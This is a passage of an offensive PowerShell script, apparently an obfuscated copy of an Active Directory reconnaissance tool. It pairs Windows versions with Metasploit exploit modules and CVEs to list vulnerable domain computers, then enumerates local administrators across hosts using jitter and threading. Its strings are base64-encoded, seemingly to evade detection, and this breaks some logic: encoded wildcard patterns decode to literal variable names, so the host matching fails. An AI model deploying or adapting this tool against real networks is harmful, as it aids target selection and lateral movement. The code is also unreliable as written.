    $Null = $TableExploits.Rows.Add(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("V2luZG93cyBTZXJ2ZXIgMjAwMw=="))),"",([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("ZXhwbG9pdC93aW5kb3dzL3NtYi9tczA2XzA0MF9uZXRhcGk="))),([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("aHR0cDovL3d3dy5jdmVkZXRhaWxzLmNvbS9jdmUvMjAwNi0zNDM5"))))  
    $Null = $TableExploits.Rows.Add(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("V2luZG93cyBTZXJ2ZXIgMjAwMw=="))),"",([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("ZXhwbG9pdC93aW5kb3dzL3NtYi9tczA4XzA2N19uZXRhcGk="))),([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("aHR0cDovL3d3dy5jdmVkZXRhaWxzLmNvbS9jdmUvMjAwOC00MjUw"))))  
    $Null = $TableExploits.Rows.Add(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("V2luZG93cyBTZXJ2ZXIgMjAwMw=="))),"",([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("ZXhwbG9pdC93aW5kb3dzL3dpbnMvbXMwNF8wNDVfd2lucw=="))),([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("aHR0cDovL3d3dy5jdmVkZXRhaWxzLmNvbS9jdmUvMjAwNC0xMDgwLw=="))))  
    $Null = $TableExploits.Rows.Add(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("V2luZG93cyBTZXJ2ZXIgMjAwMyBSMg=="))),"",([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("ZXhwbG9pdC93aW5kb3dzL2RjZXJwYy9tczAzXzAyNl9kY29t"))),([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("aHR0cDovL3d3dy5jdmVkZXRhaWxzLmNvbS9jdmUvMjAwMy0wMzUyLw=="))))  
    $Null = $TableExploits.Rows.Add(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("V2luZG93cyBTZXJ2ZXIgMjAwMyBSMg=="))),"",([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("ZXhwbG9pdC93aW5kb3dzL3NtYi9tczA0XzAxMV9sc2Fzcw=="))),([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("aHR0cDovL3d3dy5jdmVkZXRhaWxzLmNvbS9jdmUvMjAwMy0wNTMzLw=="))))  
    $Null = $TableExploits.Rows.Add(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("V2luZG93cyBTZXJ2ZXIgMjAwMyBSMg=="))),"",([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("ZXhwbG9pdC93aW5kb3dzL3NtYi9tczA2XzA0MF9uZXRhcGk="))),([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("aHR0cDovL3d3dy5jdmVkZXRhaWxzLmNvbS9jdmUvMjAwNi0zNDM5"))))  
    $Null = $TableExploits.Rows.Add(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("V2luZG93cyBTZXJ2ZXIgMjAwMyBSMg=="))),"",([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("ZXhwbG9pdC93aW5kb3dzL3dpbnMvbXMwNF8wNDVfd2lucw=="))),([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("aHR0cDovL3d3dy5jdmVkZXRhaWxzLmNvbS9jdmUvMjAwNC0xMDgwLw=="))))  
    $Null = $TableExploits.Rows.Add(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("V2luZG93cyBTZXJ2ZXIgMjAwOA=="))),([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmljZSBQYWNrIDI="))),([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("ZXhwbG9pdC93aW5kb3dzL3NtYi9tczA5XzA1MF9zbWIyX25lZ290aWF0ZV9mdW5jX2luZGV4"))),([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("aHR0cDovL3d3dy5jdmVkZXRhaWxzLmNvbS9jdmUvMjAwOS0zMTAz"))))  
    $Null = $TableExploits.Rows.Add(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("V2luZG93cyBTZXJ2ZXIgMjAwOA=="))),([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmljZSBQYWNrIDI="))),([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("ZXhwbG9pdC93aW5kb3dzL3NtYi9tczEwXzA2MV9zcG9vbHNz"))),([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("aHR0cDovL3d3dy5jdmVkZXRhaWxzLmNvbS9jdmUvMjAxMC0yNzI5"))))  
    $Null = $TableExploits.Rows.Add(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("V2luZG93cyBTZXJ2ZXIgMjAwOA=="))),"",([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("ZXhwbG9pdC93aW5kb3dzL3NtYi9tczA4XzA2N19uZXRhcGk="))),([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("aHR0cDovL3d3dy5jdmVkZXRhaWxzLmNvbS9jdmUvMjAwOC00MjUw"))))  
    $Null = $TableExploits.Rows.Add(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("V2luZG93cyBTZXJ2ZXIgMjAwOA=="))),"",([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("ZXhwbG9pdC93aW5kb3dzL3NtYi9tczA5XzA1MF9zbWIyX25lZ290aWF0ZV9mdW5jX2luZGV4"))),([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("aHR0cDovL3d3dy5jdmVkZXRhaWxzLmNvbS9jdmUvMjAwOS0zMTAz"))))  
    $Null = $TableExploits.Rows.Add(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("V2luZG93cyBTZXJ2ZXIgMjAwOA=="))),"",([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("ZXhwbG9pdC93aW5kb3dzL3NtYi9tczEwXzA2MV9zcG9vbHNz"))),([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("aHR0cDovL3d3dy5jdmVkZXRhaWxzLmNvbS9jdmUvMjAxMC0yNzI5"))))  
    $Null = $TableExploits.Rows.Add(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("V2luZG93cyBTZXJ2ZXIgMjAwOCBSMg=="))),"",([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("ZXhwbG9pdC93aW5kb3dzL3NtYi9tczEwXzA2MV9zcG9vbHNz"))),([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("aHR0cDovL3d3dy5jdmVkZXRhaWxzLmNvbS9jdmUvMjAxMC0yNzI5"))))  
    $Null = $TableExploits.Rows.Add(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("V2luZG93cyBWaXN0YQ=="))),([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVyIFBhY2sgMQ=="))),([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("ZXhwbG9pdC93aW5kb3dzL3NtYi9tczA4XzA2N19uZXRhcGk="))),([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("aHR0cDovL3d3dy5jdmVkZXRhaWxzLmNvbS9jdmUvMjAwOC00MjUw"))))  
    $Null = $TableExploits.Rows.Add(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("V2luZG93cyBWaXN0YQ=="))),([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVyIFBhY2sgMQ=="))),([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("ZXhwbG9pdC93aW5kb3dzL3NtYi9tczA5XzA1MF9zbWIyX25lZ290aWF0ZV9mdW5jX2luZGV4"))),([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("aHR0cDovL3d3dy5jdmVkZXRhaWxzLmNvbS9jdmUvMjAwOS0zMTAz"))))  
    $Null = $TableExploits.Rows.Add(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("V2luZG93cyBWaXN0YQ=="))),([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVyIFBhY2sgMQ=="))),([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("ZXhwbG9pdC93aW5kb3dzL3NtYi9tczEwXzA2MV9zcG9vbHNz"))),([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("aHR0cDovL3d3dy5jdmVkZXRhaWxzLmNvbS9jdmUvMjAxMC0yNzI5"))))  
    $Null = $TableExploits.Rows.Add(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("V2luZG93cyBWaXN0YQ=="))),([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmljZSBQYWNrIDI="))),([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("ZXhwbG9pdC93aW5kb3dzL3NtYi9tczA5XzA1MF9zbWIyX25lZ290aWF0ZV9mdW5jX2luZGV4"))),([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("aHR0cDovL3d3dy5jdmVkZXRhaWxzLmNvbS9jdmUvMjAwOS0zMTAz"))))  
    $Null = $TableExploits.Rows.Add(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("V2luZG93cyBWaXN0YQ=="))),([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmljZSBQYWNrIDI="))),([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("ZXhwbG9pdC93aW5kb3dzL3NtYi9tczEwXzA2MV9zcG9vbHNz"))),([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("aHR0cDovL3d3dy5jdmVkZXRhaWxzLmNvbS9jdmUvMjAxMC0yNzI5"))))  
    $Null = $TableExploits.Rows.Add(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("V2luZG93cyBWaXN0YQ=="))),"",([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("ZXhwbG9pdC93aW5kb3dzL3NtYi9tczA4XzA2N19uZXRhcGk="))),([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("aHR0cDovL3d3dy5jdmVkZXRhaWxzLmNvbS9jdmUvMjAwOC00MjUw"))))  
    $Null = $TableExploits.Rows.Add(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("V2luZG93cyBWaXN0YQ=="))),"",([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("ZXhwbG9pdC93aW5kb3dzL3NtYi9tczA5XzA1MF9zbWIyX25lZ290aWF0ZV9mdW5jX2luZGV4"))),([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("aHR0cDovL3d3dy5jdmVkZXRhaWxzLmNvbS9jdmUvMjAwOS0zMTAz"))))  
    $Null = $TableExploits.Rows.Add(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("V2luZG93cyBYUA=="))),([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVyIFBhY2sgMQ=="))),([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("ZXhwbG9pdC93aW5kb3dzL2RjZXJwYy9tczAzXzAyNl9kY29t"))),([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("aHR0cDovL3d3dy5jdmVkZXRhaWxzLmNvbS9jdmUvMjAwMy0wMzUyLw=="))))  
    $Null = $TableExploits.Rows.Add(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("V2luZG93cyBYUA=="))),([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVyIFBhY2sgMQ=="))),([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("ZXhwbG9pdC93aW5kb3dzL2RjZXJwYy9tczA1XzAxN19tc21x"))),([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("aHR0cDovL3d3dy5jdmVkZXRhaWxzLmNvbS9jdmUvMjAwNS0wMDU5"))))  
    $Null = $TableExploits.Rows.Add(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("V2luZG93cyBYUA=="))),([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVyIFBhY2sgMQ=="))),([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("ZXhwbG9pdC93aW5kb3dzL3NtYi9tczA0XzAxMV9sc2Fzcw=="))),([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("aHR0cDovL3d3dy5jdmVkZXRhaWxzLmNvbS9jdmUvMjAwMy0wNTMzLw=="))))  
    $Null = $TableExploits.Rows.Add(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("V2luZG93cyBYUA=="))),([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVyIFBhY2sgMQ=="))),([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("ZXhwbG9pdC93aW5kb3dzL3NtYi9tczA1XzAzOV9wbnA="))),([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("aHR0cDovL3d3dy5jdmVkZXRhaWxzLmNvbS9jdmUvMjAwNS0xOTgz"))))  
    $Null = $TableExploits.Rows.Add(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("V2luZG93cyBYUA=="))),([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVyIFBhY2sgMQ=="))),([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("ZXhwbG9pdC93aW5kb3dzL3NtYi9tczA2XzA0MF9uZXRhcGk="))),([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("aHR0cDovL3d3dy5jdmVkZXRhaWxzLmNvbS9jdmUvMjAwNi0zNDM5"))))  
    $Null = $TableExploits.Rows.Add(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("V2luZG93cyBYUA=="))),([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmljZSBQYWNrIDI="))),([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("ZXhwbG9pdC93aW5kb3dzL2RjZXJwYy9tczA1XzAxN19tc21x"))),([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("aHR0cDovL3d3dy5jdmVkZXRhaWxzLmNvbS9jdmUvMjAwNS0wMDU5"))))  
    $Null = $TableExploits.Rows.Add(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("V2luZG93cyBYUA=="))),([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmljZSBQYWNrIDI="))),([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("ZXhwbG9pdC93aW5kb3dzL3NtYi9tczA2XzA0MF9uZXRhcGk="))),([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("aHR0cDovL3d3dy5jdmVkZXRhaWxzLmNvbS9jdmUvMjAwNi0zNDM5"))))  
    $Null = $TableExploits.Rows.Add(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("V2luZG93cyBYUA=="))),([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmljZSBQYWNrIDI="))),([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("ZXhwbG9pdC93aW5kb3dzL3NtYi9tczA2XzA2Nl9ud2FwaQ=="))),([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("aHR0cDovL3d3dy5jdmVkZXRhaWxzLmNvbS9jdmUvMjAwNi00Njg4"))))  
    $Null = $TableExploits.Rows.Add(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("V2luZG93cyBYUA=="))),([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmljZSBQYWNrIDI="))),([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("ZXhwbG9pdC93aW5kb3dzL3NtYi9tczA2XzA3MF93a3NzdmM="))),([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("aHR0cDovL3d3dy5jdmVkZXRhaWxzLmNvbS9jdmUvMjAwNi00Njkx"))))  
    $Null = $TableExploits.Rows.Add(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("V2luZG93cyBYUA=="))),([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmljZSBQYWNrIDI="))),([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("ZXhwbG9pdC93aW5kb3dzL3NtYi9tczA4XzA2N19uZXRhcGk="))),([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("aHR0cDovL3d3dy5jdmVkZXRhaWxzLmNvbS9jdmUvMjAwOC00MjUw"))))  
    $Null = $TableExploits.Rows.Add(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("V2luZG93cyBYUA=="))),([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmljZSBQYWNrIDI="))),([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("ZXhwbG9pdC93aW5kb3dzL3NtYi9tczEwXzA2MV9zcG9vbHNz"))),([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("aHR0cDovL3d3dy5jdmVkZXRhaWxzLmNvbS9jdmUvMjAxMC0yNzI5"))))  
    $Null = $TableExploits.Rows.Add(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("V2luZG93cyBYUA=="))),([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmljZSBQYWNrIDM="))),([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("ZXhwbG9pdC93aW5kb3dzL3NtYi9tczA4XzA2N19uZXRhcGk="))),([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("aHR0cDovL3d3dy5jdmVkZXRhaWxzLmNvbS9jdmUvMjAwOC00MjUw"))))  
    $Null = $TableExploits.Rows.Add(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("V2luZG93cyBYUA=="))),([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmljZSBQYWNrIDM="))),([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("ZXhwbG9pdC93aW5kb3dzL3NtYi9tczEwXzA2MV9zcG9vbHNz"))),([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("aHR0cDovL3d3dy5jdmVkZXRhaWxzLmNvbS9jdmUvMjAxMC0yNzI5"))))  
    $Null = $TableExploits.Rows.Add(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("V2luZG93cyBYUA=="))),"",([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("ZXhwbG9pdC93aW5kb3dzL2RjZXJwYy9tczAzXzAyNl9kY29t"))),([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("aHR0cDovL3d3dy5jdmVkZXRhaWxzLmNvbS9jdmUvMjAwMy0wMzUyLw=="))))  
    $Null = $TableExploits.Rows.Add(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("V2luZG93cyBYUA=="))),"",([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("ZXhwbG9pdC93aW5kb3dzL2RjZXJwYy9tczA1XzAxN19tc21x"))),([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("aHR0cDovL3d3dy5jdmVkZXRhaWxzLmNvbS9jdmUvMjAwNS0wMDU5"))))  
    $Null = $TableExploits.Rows.Add(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("V2luZG93cyBYUA=="))),"",([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("ZXhwbG9pdC93aW5kb3dzL3NtYi9tczA2XzA0MF9uZXRhcGk="))),([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("aHR0cDovL3d3dy5jdmVkZXRhaWxzLmNvbS9jdmUvMjAwNi0zNDM5"))))  
    $Null = $TableExploits.Rows.Add(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("V2luZG93cyBYUA=="))),"",([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("ZXhwbG9pdC93aW5kb3dzL3NtYi9tczA4XzA2N19uZXRhcGk="))),([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("aHR0cDovL3d3dy5jdmVkZXRhaWxzLmNvbS9jdmUvMjAwOC00MjUw"))))  

    
    Write-Verbose ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("WypdIENoZWNraW5nIGNvbXB1dGVycyBmb3IgdnVsbmVyYWJsZSBPUyBhbmQgU1AgbGV2ZWxzLi4u")))

    
    
    

    
    $TableVulnComputers = New-Object System.Data.DataTable 
    $Null = $TableVulnComputers.Columns.Add(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q29tcHV0ZXJOYW1l"))))
    $Null = $TableVulnComputers.Columns.Add(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("T3BlcmF0aW5nU3lzdGVt"))))
    $Null = $TableVulnComputers.Columns.Add(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmljZVBhY2s="))))
    $Null = $TableVulnComputers.Columns.Add(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("TGFzdExvZ29u"))))
    $Null = $TableVulnComputers.Columns.Add(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("TXNmTW9kdWxl"))))
    $Null = $TableVulnComputers.Columns.Add(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q1ZF"))))

    
    $TableExploits | ForEach-Object {
                 
        $ExploitOS = $_.OperatingSystem
        $ExploitSP = $_.ServicePack
        $ExploitMsf = $_.MsfModule
        $ExploitCVE = $_.CVE

        
        $TableAdsComputers | ForEach-Object {
            
            $AdsHostname = $_.Hostname
            $AdsOS = $_.OperatingSystem
            $AdsSP = $_.ServicePack                                                        
            $AdsLast = $_.LastLogon
            
            
            if ($AdsOS -like ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("JEV4cGxvaXRPUyo="))) -and $AdsSP -like ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("JEV4cGxvaXRTUA=="))) ) {                    
                
                $Null = $TableVulnComputers.Rows.Add($AdsHostname,$AdsOS,$AdsSP,$AdsLast,$ExploitMsf,$ExploitCVE)
            }
        }
    }     
    
    
    $VulnComputer = $TableVulnComputers | Select-Object ComputerName -Unique | Measure-Object
    $VulnComputerCount = $VulnComputer.Count
    if ($VulnComputer.Count -gt 0) {
        
        Write-Verbose ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("WytdIEZvdW5kICRWdWxuQ29tcHV0ZXJDb3VudCBwb3RlbnRpYWxseSB2dWxuZXJhYmxlIHN5c3RlbXMh")))
        $TableVulnComputers | Sort-Object { $_.lastlogon -as [datetime]} -Descending
    }
    else {
        Write-Verbose ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Wy1dIE5vIHZ1bG5lcmFibGUgc3lzdGVtcyB3ZXJlIGZvdW5kLg==")))
    }
}


function Invoke-EnumerateLocalAdmin {


    [CmdletBinding()]
    param(
        [Parameter(Position=0,ValueFromPipeline=$True)]
        [Alias('Hosts')]
        [String[]]
        $ComputerName,

        [ValidateScript({Test-Path -Path $_ })]
        [Alias('HostList')]
        [String]
        $ComputerFile,

        [String]
        $ComputerFilter,

        [String]
        $ComputerADSpath,

        [Switch]
        $NoPing,

        [UInt32]
        $Delay = 0,

        [Double]
        $Jitter = .3,

        [String]
        $OutFile,

        [Switch]
        $NoClobber,

        [Switch]
        $TrustGroups,

        [String]
        $Domain,

        [String]
        $DomainController,

        [Switch]
        $SearchForest,

        [ValidateRange(1,100)] 
        [Int]
        $Threads
    )

    begin {
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RGVidWc=")))]) {
            $DebugPreference = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q29udGludWU=")))
        }

        
        $RandNo = New-Object System.Random

        Write-Verbose ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("WypdIFJ1bm5pbmcgSW52b2tlLUVudW1lcmF0ZUxvY2FsQWRtaW4gd2l0aCBkZWxheSBvZiAkRGVsYXk=")))

        if(!$ComputerName) { 

            if($Domain) {
                $TargetDomains = @($Domain)
            }
            elseif($SearchForest) {
                
                $TargetDomains = Get-NetForestDomain | ForEach-Object { $_.Name }
            }
            else {
                
                $TargetDomains = @( (Get-NetDomain).name )
            }

            
            if($ComputerFile) {
                $ComputerName = Get-Content -Path $ComputerFile
            }
            else {
                [array]$ComputerName = @()
                ForEach ($Domain in $TargetDomains) {
                    Write-Verbose ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("WypdIFF1ZXJ5aW5nIGRvbWFpbiAkRG9tYWluIGZvciBob3N0cw==")))
                    $ComputerName += Get-NetComputer -Filter $ComputerFilter -ADSpath $ComputerADSpath -Domain $Domain -DomainController $DomainController
                }
            }

            
            $ComputerName = $ComputerName | Where-Object { $_ } | Sort-Object -Unique | Sort-Object { Get-Random }
            if($($ComputerName.Count) -eq 0) {
                throw ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Tm8gaG9zdHMgZm91bmQh")))
            }
        }

        
        if(!$NoClobber) {
            if ($OutFile -and (Test-Path -Path $OutFile)) { Remove-Item -Path $OutFile }
        }

        if($TrustGroups) {
            
            Write-Verbose ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RGV0ZXJtaW5pbmcgZG9tYWluIHRydXN0IGdyb3Vwcw==")))

            
            $TrustGroupNames = Find-ForeignGroup -Domain $Domain -DomainController $DomainController | ForEach-Object { $_.GroupName } | Sort-Object -Unique

            $TrustGroupsSIDs = $TrustGroupNames | ForEach-Object { 
                
                
                Get-NetGroup -Domain $Domain -DomainController $DomainController -GroupName $_ -FullData | Where-Object { $_.objectsid -notmatch ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Uy0xLTUtMzItNTQ0"))) } | ForEach-Object { $_.objectsid }
            }

            
            $DomainSID = Get-DomainSID -Domain $Domain
        }

        
        $HostEnumBlock = {
            param($ComputerName, $Ping, $OutFile, $DomainSID, $TrustGroupsSIDs)

            
            $Up = $True
            if($Ping) {
                $Up = Test-Connection -Count 1 -Quiet -ComputerName $ComputerName
            }
            if($Up) {
                
                $LocalAdmins = Get-NetLocalGroup -ComputerName $ComputerName

                
                if($DomainSID -and $TrustGroupSIDS) {
                    
                    $LocalSID = ($LocalAdmins | Where-Object { $_.SID -match ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("LiotNTAwJA=="))) }).SID -replace ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("LTUwMCQ=")))

                    
                    
                    $LocalAdmins = $LocalAdmins | Where-Object { ($TrustGroupsSIDs -contains $_.SID) -or ((-not $_.SID.startsWith($LocalSID)) -and (-not $_.SID.startsWith($DomainSID))) }
                }

                if($LocalAdmins -and ($LocalAdmins.Length -ne 0)) {
                    
                    if($OutFile) {
                        $LocalAdmins | Export-PowerViewCSV -OutFile $OutFile
                    }
                    else {
                        
                        $LocalAdmins
                    }
                }
                else {
                    Write-Verbose ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("WyFdIE5vIHVzZXJzIHJldHVybmVkIGZyb20gJFNlcnZlcg==")))
                }
            }
        }

    }

    process {

        if($Threads) {
            Write-Verbose ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VXNpbmcgdGhyZWFkaW5nIHdpdGggdGhyZWFkcyA9ICRUaHJlYWRz")))

            
            $ScriptParams = @{
                ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UGluZw=="))) = $(-not $NoPing)
                ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("T3V0RmlsZQ=="))) = $OutFile
                ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RG9tYWluU0lE"))) = $DomainSID
                ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VHJ1c3RHcm91cHNTSURz"))) = $TrustGroupsSIDs
            }

            
            Invoke-ThreadedFunction -ComputerName $ComputerName -ScriptBlock $HostEnumBlock -ScriptParameters $ScriptParams
        }

        else {
            if(-not $NoPing -and ($ComputerName.count -ne 1)) {
                
                $Ping = {param($ComputerName) if(Test-Connection -ComputerName $ComputerName -Count 1 -Quiet -ErrorAction Stop){$ComputerName}}
                $ComputerName = Invoke-ThreadedFunction -NoImports -ComputerName $ComputerName -ScriptBlock $Ping -Threads 100
            }

            Write-Verbose (([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("WypdIFRvdGFsIG51bWJlciBvZiBhY3RpdmUgaG9zdHM6IHswfQ=="))) -f $($ComputerName.count))
            $Counter = 0

            ForEach ($Computer in $ComputerName) {

                $Counter = $Counter + 1

                
                Start-Sleep -Seconds $RandNo.Next((1-$Jitter)*$Delay, (1+$Jitter)*$Delay)

